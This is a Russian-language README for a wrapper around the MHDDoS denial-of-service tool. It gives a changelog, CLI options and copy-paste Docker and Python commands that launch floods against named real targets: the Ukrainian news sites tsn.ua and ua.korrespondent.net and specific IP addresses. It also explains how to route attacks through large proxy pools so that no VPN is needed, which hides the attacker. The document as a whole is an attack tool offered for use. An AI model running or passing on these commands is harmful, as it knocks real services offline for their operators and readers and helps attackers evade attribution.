Скрипт-обертка для запуска мощного DDoS инструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).

- **Не требует VPN** - скачивает и подбирает рабочие прокси для атаки (доступный режим `--vpn` по желанию)
- Атака **нескольких целей** с автоматической балансировкой нагрузки
- Использует **различные методы для атаки**

### ⏱ Последние обновления

- **23.04.2022** 
  - Изменен флажок `--vpn` - теперь ваш IP/VPN используется **вместе** с прокси, а не вместо. Чтобы достичь предыдущего поведения, используйте `--vpn 100`
- **20.04.2022**
  - Значительно улучшено использование ресурсов системы для эффективной атаки
  - Добавлен параметр `--udp-threads` для контроля мощности UDP атак (по умолчанию 1)

<details>
  <summary>📜 Раньше</summary>

- **18.04.2022** 
  - В режиме `--debug` добавлена ​​статистика "всего" по всем целям
  - Добавлено больше прокси
- **13.04.2022** 
  - Добавлена ​​возможность отключать цели и добавлять комментарии в файле конфигурации - теперь начинающиеся строки на символ # игнорируются
  - Исправлена ​​проблема полного зависания скрипта после длительной работы и другие ошибки при смене цикла
  - Исправлено отображение цветов на Windows (без редактирования реестра)
  - Теперь в случае недоступности всех целей скрипт будет ожидать вместо полной остановки
- **09.04.2022** Новая система прокси – теперь каждый получает ~200 прокси для атаки из общего пула более 10.000. Параметры `-p` (`--period`) и `--proxy-timeout` больше не используются
- **04.04.2022** Добавлена ​​возможность использования собственного списка прокси для атаки - [инструкция](#собственные-прокси)
- **03.04.2022** Исправлена ​​ошибка Too many open files (спасибо, @kobzar-darmogray и @euclid-catoptrics)
- **02.04.2022** Рабочие потоки больше не перезапускаются на каждый цикл, а используются повторно. Также исправлена ​​работа Ctrl-C
- **01.04.2022** Обновлен метод CFB в соответствии с MHDDoS.
- **31.03.2022** Добавлены надежные DNS серверы для резолвинга цели вместо системных. (1.1.1.1, 8.8.8.8 etc.)
- **29.03.2022** Добавлена ​​поддержка локального файла конфигурации (очень спасибо @kobzar-darmogray).
- **28.03.2022** Добавлен табличный вывод `--table` (очень спасибо, @alexneo2003).
- **27.03.2022**
    - Разрешен запуск методов DBG, BOMB (спасибо @drew-kun за PR) и KILLER для соответствия оригинальному MHDDoS.
- **26.03.2022**
    - Запуск всех выбранных атак вместо случайного выбора
    - Уменьшено использование RAM на большом количестве целей – теперь на RAM влияет только параметр `-t`
    - Добавлено кэширование DNS и корректная обработка проблем с резолвингом
- **25.03.2022** Добавлен режим VPN вместо прокси (флажок `--vpn`)
- **25.03.2022** MHDDoS включен в состав репозитория для большего контроля над разработкой и защитой от неожиданных
  изменений
</details>

### 💽 Установка | Installation - [инструкции ЗДЕСЬ](/docs/installation.md)

### 🕹 Запуск | Running (приведены разные варианты целей)

#### Docker

    docker run -it --rm --pull always ghcr.io/Bionec/mhddos_p https://tsn.ua 5.177.56.124:80 tcp://194.62.14.124:4477

#### Python (если не работает – просто python вместо python3)

    python3 runner.py https://tsn.ua 5.177.56.124:80 tcp://194.62.14.124:4477

### 🛠 Настройки (больше в разделе [CLI](#cli))

**Все параметры можно комбинировать**, можно указывать и до и после перечня целей

Изменить нагрузку – `-t XXXX` – количество потоков, по умолчанию – CPU*1000

    docker run -it --rm --pull always ghcr.io/Bionec/mhddos_p -t 3000 https://tsn.ua https://ua.korrespondent.net

Чтобы просмотреть информацию о ходе атаки, добавьте флажок `--table` для таблицы, `--debug` для текста

    docker run -it --rm --pull always ghcr.io/Bionec/mhddos_p --table https://tsn.ua https://ua.korrespondent.net

### 🐳 Комьюнити
- [Подробный разбор MHDDoS_proxy](https://github.com/Bionec/DDoS-for-all_p/blob/main/MHDDoS_proxy.md)
- [Utility для преобразования общих целей в формат конфигурации](https://github.com/kobzar-darmogray/mhddos_proxy_utils)
- [Анализ средства mhddos_proxy](https://github.com/Bionec/mhddos_p_docs/blob/main/docs/README_analiz_sredstva_mhddos_h.md#%D0%B0%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7-%D1%81%D1%80%D0%B5%D0%B4%D1%81%D1%82%D0%B2%D0%B0-mhddos_proxy)
- [Пример запуска через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)

### CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with attack targets
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxies URL|path     URL or local path to file with proxies to use
      --udp-threads 1        Total number of threads to run for UDP sockets (defaults to 1)
      --http-methods GET     List of HTTP(s) attack methods to use (default is GET + POST|STRESS).
                             Refer to MHDDoS docs for available options (https://github.com/MHProDev/MHDDoS)

### Собственные прокси

#### Формат файла:

    114.231.123.38:1234
    username:password@114.231.123.38:3065
    socks5://114.231.155.38:5678
    socks4://username:password@114.231.123.38:3065

#### Удаленный файл (равно для Python и Docker)

    python3 runner.py --proxies https://pastebin.com/raw/UkFWzLOt https://tsn.ua

#### Для Python

Положите файл рядом с `runner.py` и добавьте в команду следующий флажок (замените `proxies.txt` на имя файла)

    python3 runner.py --proxies proxies.txt https://tsn.ua

#### Для Docker
Нужно монтировать volume, чтобы Docker имел доступ к файлу.
Обязательно указывать абсолютный путь к файлу и не потерять `/` перед именем файла

    docker run -it --rm --pull always -v /home/user/ddos/mhddos_p/proxies.txt:/proxies.txt ghcr.io/Bionec/mhddos_p --proxies /proxies.txt https://tsn.ua
